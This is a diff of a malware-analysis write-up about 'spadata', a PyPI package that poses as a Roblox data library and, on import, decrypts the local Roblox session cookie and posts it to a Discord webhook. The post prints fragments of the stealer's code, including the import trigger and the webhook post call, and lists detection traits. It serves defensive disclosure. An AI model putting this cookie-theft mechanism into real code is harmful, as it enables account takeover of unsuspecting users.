@@ -8,9 +8,7 @@ ecosystem: PyPI
 
 <img src="/assets/images/spadata-roblox-stickup-meme.jpg" alt="Meme: a kitten with its paws up at gunpoint — 'GIMME ALL YOUR ROBLOX PLZ.' spadata mugs the victim for exactly one thing: their Roblox session cookie.">
 
-Most PyPI stealers ship a tool that at least half-works as a disguise. `spadata` doesn't bother: it sells itself as a Python library for managing your Roblox DataStore data and delivers none of it — no storage code, no API calls, nothing it advertises. What's actually inside runs the moment you `import spadata`, and all it does is steal the local Roblox session cookie and post it to a Discord webhook. The README can't even keep the name straight, calling the package «spaysdata» in its own description. The meme is the spec: walk up to a Roblox player and ask for everything. And it makes you pull the trigger — nobody runs anything, the import is the stickup.
-
-Traits below are from cleave `2.0.0-rc.4` (traits `126f8e4b2`); the wheel was unpacked and read statically, nothing was imported.
+`spadata` sells itself as a Python library for managing your Roblox DataStore and ships none of it — no storage code, no API calls, just a cookie grab that fires the moment you `import spadata`, with the README misspelling its own name «spaysdata» along the way.
 
 ## Package metadata
 
@@ -28,7 +26,7 @@ Traits below are from cleave `2.0.0-rc.4` (traits `126f8e4b2`); the wheel was un
 
 ## One import, one cookie, one webhook
 
-The wheel holds two files and no product. `__init__.py` calls the stealer at import time inside a bare try/except, so the theft fires the moment Python loads the package and any error dies silently. It copies Roblox's local cookie store `robloxcookies.dat` to the temp folder and reads the base64 cookie field inside. Roblox keeps that field DPAPI-encrypted, so the code calls `win32crypt.CryptUnprotectData` itself — the thief unlocks the loot before taking it. The cleartext `.ROBLOSECURITY` cookie then goes straight to a Discord webhook hardcoded in plaintext at the top of the file. That cookie is the whole account — replayed in a browser it walks past the password and 2FA, which for a Roblox player is the Robux, the inventory, and the resale value in one string. It even captions the theft, firing a `Decrypted Content:` label just before the cookie.
+The wheel holds two files and no product: `__init__.py` calls the stealer at import time inside a bare try/except, so the theft fires when Python loads the package and any error dies silently. It copies Roblox's local cookie store `robloxcookies.dat` to the temp folder, reads the base64 field, and — since Roblox keeps it DPAPI-encrypted — calls `win32crypt.CryptUnprotectData` to unlock the loot before taking it. The cleartext `.ROBLOSECURITY` cookie then posts straight to a hardcoded Discord webhook, captioned `Decrypted Content:`; replayed in a browser it walks past the password and 2FA, handing over the Robux, the inventory, and the resale value in one string.
 
 <pre class="lang-js"><code><span class="tok-com"># __init__.py — import is the trigger</span>
 <span class="tok-kw">from</span> .main <span class="tok-kw">import</span> retrieve_roblox_cookies
@@ -53,9 +51,7 @@ requests.<span class="tok-fn">post</span>(webhook, json={<span class="tok-str">"
 | <span class="sev-dot notable" title="notable"></span> | `micro-behaviors/data/control-flow/module-exec` | Import-time call silenced by try/except |
 | <span class="sev-dot notable" title="notable"></span> | `objectives/anti-static/obfuscation/code-metrics/source` | Russian comments trip the non-ASCII ratio |
 
-## A stickup, not a heist
-
-Strip the costume and there's almost nothing here: no persistence, no second stage, no obfuscation past a try/except, and a webhook anyone can report and burn. The point was never craft — it's that a package selling itself as Roblox data management ships zero data code and one cookie grab. It works because the mark came for a shortcut and was never going to open `__init__.py`. The cat in the meme has its paws up; the gun is a `pip install`.
+There's no persistence, no second stage, and no obfuscation past the try/except — just a stickup that works because the mark came for a shortcut and was never going to open `__init__.py`.
 
 ## Indicators
 
